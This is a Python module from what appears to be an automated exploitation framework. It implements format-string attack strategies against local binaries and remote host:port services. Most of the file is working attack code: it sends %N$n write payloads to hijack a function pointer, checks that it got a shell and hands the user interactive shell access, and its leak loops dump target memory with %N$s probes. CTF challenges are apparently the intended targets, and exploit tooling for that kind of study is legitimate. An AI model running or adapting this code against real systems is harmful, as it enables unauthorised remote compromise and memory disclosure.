"""P7.8: format string strategies (local + remote) + leak-only bypass.

Replaces the v3.1 monolith's ``system_fmtstr`` (L863-894, local)
+ ``system_fmtstr_remote`` (L1224-1241, remote) + ``fmtstr_print_strings``
(L1243-1258, local bypass) + ``fmtstr_print_strings_remote``
(L1260-1275, remote bypass) ad-hoc functions with three
:class:`ExploitStrategy` subclasses.

The fmtstr exploitation pattern
--------------------------------
* **No stack overflow needed** — fmtstr is an alternative
  attack when ``ctx.padding == 0`` (P5.1 ``test_stack_overflow``
  fails to find a buffer overflow).  The P7 candidates
  registry gates this on ``ctx.padding == 0``.
* **Arbitrary-address write via ``%n``** — the format string
  specifier ``%N$n`` writes a 4-byte (POSIX says ``int``) to
  the address at stack position N.  v3.1's payload puts the
  target BSS address at the start of the format string
  (so position 1 contains the address pointer), then uses
  ``%N$n`` to write the count-of-bytes-printed-so-far (which
  equals the 4-byte address itself) to that address — turning
  a function pointer at the BSS into a ``system``-like target.
* **Padding=0 gate** — v3.1's main() only enters the fmtstr
  branch when ``padding == 0`` (no BOF).  P7.8 honors this
  same gate via the custom :meth:`matches` override.

Per ``rebuild.md`` §6.8 P7.8 + ``refactor.md`` §3.2.2 + P6.7
primitive contract.

Three strategies in one module
-------------------------------
1. **FmtstrX32LocalStrategy** — main fmtstr path (local x32).
2. **FmtstrX64LocalStrategy** — main fmtstr path (local x64).
3. **FmtstrX32RemoteStrategy** — main fmtstr path (remote x32).
4. **FmtstrX64RemoteStrategy** — main fmtstr path (remote x64).
5. **FmtstrPrintStringsX32LocalStrategy** — leak-only bypass
   (local x32) — does 100 sendlines of ``%N$s`` to dump
   memory, no write.  Used when ``has_system=False``
   (can't write to a function pointer without a sensible
   target).
6. **FmtstrPrintStringsX32RemoteStrategy** — leak-only bypass
   (remote x32).

Per §4.8: P7.8 spec says "含 `fmtstr_print_strings` 旁路" — the
"leak only" branch is part of this module, not a separate one.

Priority ``FMTSTR = 50`` per 附录 A — last-resort
("兜底" = "fallback").  Tried when all higher-priority
strategies have been filtered out.

The P6.7 v3.1 quirk: hardcoded p32 for local, p64 for remote
----------------------------------------------------------------
v3.1's local variant always uses ``p32`` regardless of
binary's bit-width; the remote variant always uses ``p64``.
This was a v3.1 implementation bug — primitives are
bit-width concerns, runtime is a strategy concern.  P6.7's
pure builder reads ``ctx.binary.bit`` and selects the right
``pNN`` encoder; P7.8 follows the same pattern (no longer
hardcoded per-runtime).
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import Colors, print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import FMTSTR
from autopwn.exp.registry import register
from autopwn.primitives.fmtstr import (
    FmtstrX32,
    FmtstrX64,
    _resolve_fmtstr_inputs,
)
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


# 100-sendline leak loop bound — matches v3.1's hard-coded
# ``range(100)`` in ``_legacy_fmtstr_print_strings`` (L1249).
LEAK_LOOP_BOUND = 100


# ---------------------------------------------------------------------------
# Local x32 strategy
# ---------------------------------------------------------------------------


@register
class FmtstrX32LocalStrategy(ExploitStrategy):
    """Local 32-bit format-string ``%N$n`` strategy.

    Metadata (``requires_*``):
      * ``arch = 32``
      * ``remote = False``
      * ``requires = ()`` (empty — primitive checks fmtstr_buf
        + fmtstr_offset at ``build_payload`` time; the
        ``padding == 0`` gate is in :meth:`matches` because
        v3.1 main() only enters the fmtstr branch when
        ``padding == 0``).
    """
    name = "fmtstr-x32"
    priority = FMTSTR
    requires_arch = 32
    requires_remote = False
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        """Override: gate on ``padding == 0`` per v3.1 main() logic.

        v3.1 main() (L3316) only enters the format-string
        branch when ``padding == 0`` (no stack overflow).
        P7.8 honors this convention.

        See ``rwx_shellcode_x32.py`` for why this requires
        a custom override (default ``matches`` does
        ``getattr(ctx, key)`` which doesn't see ``ctx.binary.*``;
        here the issue is different — we need a custom predicate
        on a single top-level field that isn't a ``has_*`` flag).
        """
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v3.1 main() gate: only enter fmtstr branch when padding == 0.
        # v4.0.2c1: also accept fmtstr-detected binaries (canary + fmtstr
        # cases like Challenge/fmtstr1) when the orchestrator populated
        # the primitive input fields (``ctx.fmtstr_offset`` and
        # ``ctx.fmtstr_buf``) during the detect phase.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit format-string exploit locally."""
        from pwn import process

        print_section_header("EXPLOITATION: Format String - Local")
        print_payload("preparing format string exploit")

        primitive = FmtstrX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("fmtstr-x32 primitive returned empty; skipping")
            return False

        print_payload(f"payload: {payload}")

        io = process(str(ctx.binary.path))
        io.sendline(payload)

        # Build ExploitInfo per v3.1's ``handle_exploitation_success``
        # call signature (L881-892).
        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        info = ExploitInfo(
            exploit_type="Format String - Local",
            payload=payload,
            padding=0,  # fmtstr has no BOF padding
            addresses={
                "buf_addr": hex(buf_addr) if buf_addr is not None else "0x0",
                "offset": str(offset) if offset is not None else "?",
            },
            vulnerability_type="Format String Vulnerability",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Local x64 strategy
# ---------------------------------------------------------------------------


@register
class FmtstrX64LocalStrategy(ExploitStrategy):
    """Local 64-bit format-string ``%N$n`` strategy."""
    name = "fmtstr-x64"
    priority = FMTSTR
    requires_arch = 64
    requires_remote = False
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v4.0.2c1: see FmtstrX32LocalStrategy.matches — accept
        # either ``padding == 0`` (v3.1 main() gate) or a binary
        # with populated fmtstr primitive inputs.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit format-string exploit locally."""
        from pwn import process

        print_section_header("EXPLOITATION: Format String - Local (x64)")
        print_payload("preparing format string exploit")

        primitive = FmtstrX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("fmtstr-x64 primitive returned empty; skipping")
            return False

        print_payload(f"payload: {payload}")

        io = process(str(ctx.binary.path))
        io.sendline(payload)

        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        info = ExploitInfo(
            exploit_type="Format String - Local (x64)",
            payload=payload,
            padding=0,
            addresses={
                "buf_addr": hex(buf_addr) if buf_addr is not None else "0x0",
                "offset": str(offset) if offset is not None else "?",
            },
            vulnerability_type="Format String Vulnerability",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x32 strategy
# ---------------------------------------------------------------------------


@register
class FmtstrX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit format-string ``%N$n`` strategy."""
    name = "fmtstr-x32-remote"
    priority = FMTSTR
    requires_arch = 32
    requires_remote = True
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v4.0.2c1: see FmtstrX32LocalStrategy.matches — accept
        # either ``padding == 0`` (v3.1 main() gate) or a binary
        # with populated fmtstr primitive inputs.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 32-bit format-string exploit against a remote service."""
        from pwn import remote

        if ctx.remote is None:
            print_info("fmtstr-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: Format String - Remote")
        print_payload("preparing format string exploit")

        primitive = FmtstrX32()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("fmtstr-x32-remote primitive returned empty; skipping")
            return False

        print_payload(f"payload: {payload}")

        io = remote(host, port)
        io.sendline(payload)

        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        info = ExploitInfo(
            exploit_type="Format String - Remote",
            payload=payload,
            padding=0,
            addresses={
                "buf_addr": hex(buf_addr) if buf_addr is not None else "0x0",
                "offset": str(offset) if offset is not None else "?",
            },
            vulnerability_type="Format String Vulnerability",
            architecture="x32",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x64 strategy
# ---------------------------------------------------------------------------


@register
class FmtstrX64RemoteStrategy(ExploitStrategy):
    """Remote 64-bit format-string ``%N$n`` strategy."""
    name = "fmtstr-x64-remote"
    priority = FMTSTR
    requires_arch = 64
    requires_remote = True
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v4.0.2c1: see FmtstrX32LocalStrategy.matches — accept
        # either ``padding == 0`` (v3.1 main() gate) or a binary
        # with populated fmtstr primitive inputs.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit format-string exploit against a remote service."""
        from pwn import remote

        if ctx.remote is None:
            print_info("fmtstr-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("EXPLOITATION: Format String - Remote (x64)")
        print_payload("preparing format string exploit")

        primitive = FmtstrX64()
        payload = primitive.build_payload(ctx)
        if not payload:
            print_info("fmtstr-x64-remote primitive returned empty; skipping")
            return False

        print_payload(f"payload: {payload}")

        io = remote(host, port)
        io.sendline(payload)

        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        info = ExploitInfo(
            exploit_type="Format String - Remote (x64)",
            payload=payload,
            padding=0,
            addresses={
                "buf_addr": hex(buf_addr) if buf_addr is not None else "0x0",
                "offset": str(offset) if offset is not None else "?",
            },
            vulnerability_type="Format String Vulnerability",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"FmtstrX32LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# fmtstr_print_strings bypass — leak-only, no write
# ---------------------------------------------------------------------------


@register
class FmtstrPrintStringsX32LocalStrategy(ExploitStrategy):
    """Local 32-bit format-string **leak-only** bypass.

    This is the P7.8 "旁路" (bypass) strategy — when
    ``has_system=False`` (the main fmtstr path needs a
    function pointer to overwrite; without a sensible
    target, fall back to leaking program strings).

    Does 100 sendline calls with ``%N$s`` and prints anything
    non-empty.  Mirrors v3.1's ``fmtstr_print_strings``
    (L1243-1258).  Returns ``True`` if any leak succeeds;
    ``False`` otherwise (the strategy didn't "win" — caller
    can move to the next candidate).
    """
    name = "fmtstr-print-strings-x32"
    priority = FMTSTR
    requires_arch = 32
    requires_remote = False
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v4.0.2c1: see FmtstrX32LocalStrategy.matches — accept
        # either ``padding == 0`` (v3.1 main() gate) or a binary
        # with populated fmtstr primitive inputs.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """100 sendline leak loop — print non-empty results."""
        from pwn import process

        print_section_header("FORMAT STRING LEAK - Local")
        print_info("leaking program strings using format string")

        for i in range(LEAK_LOOP_BOUND):
            try:
                io = process(str(ctx.binary.path))
                io.sendline(f"%{i}$s".encode())
                result = io.recv()
                if result and len(result.strip()) > 0:
                    print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
                io.close()
            except EOFError:
                pass

        return False  # bypass doesn't "win" — caller moves on


@register
class FmtstrPrintStringsX32RemoteStrategy(ExploitStrategy):
    """Remote 32-bit format-string **leak-only** bypass."""
    name = "fmtstr-print-strings-x32-remote"
    priority = FMTSTR
    requires_arch = 32
    requires_remote = True
    requires = ()

    def matches(self, ctx: ExploitContext) -> bool:
        if self.requires_arch is not None and ctx.binary.bit != self.requires_arch:
            return False
        if self.requires_remote is not None:
            is_remote = ctx.mode == "remote"
            if self.requires_remote != is_remote:
                return False
        # v4.0.2c1: see FmtstrX32LocalStrategy.matches — accept
        # either ``padding == 0`` (v3.1 main() gate) or a binary
        # with populated fmtstr primitive inputs.
        if ctx.padding == 0:
            return True
        if ctx.fmtstr_offset is not None and ctx.fmtstr_buf is not None:
            return True
        return False

    def run(self, ctx: ExploitContext) -> bool:
        """100 sendline leak loop over remote."""
        from pwn import remote

        if ctx.remote is None:
            print_info("fmtstr-print-strings-x32-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        print_section_header("FORMAT STRING LEAK - Remote")
        print_info(f"leaking program strings from {host}:{port}")

        for i in range(LEAK_LOOP_BOUND):
            try:
                io = remote(host, port)
                io.sendline(f"%{i}$s".encode())
                result = io.recv()
                if result and len(result.strip()) > 0:
                    print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
                io.close()
            except EOFError:
                pass

        return False


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def print_critical_helper(message: str) -> None:
    """Print a critical-level message via core.logging.

    Local import to avoid hard dependency at module load.
    """
    from autopwn.core.logging import print_critical
    print_critical(message)


__all__ = [
    "FmtstrX32LocalStrategy",
    "FmtstrX64LocalStrategy",
    "FmtstrX32RemoteStrategy",
    "FmtstrX64RemoteStrategy",
    "FmtstrPrintStringsX32LocalStrategy",
    "FmtstrPrintStringsX32RemoteStrategy",
]
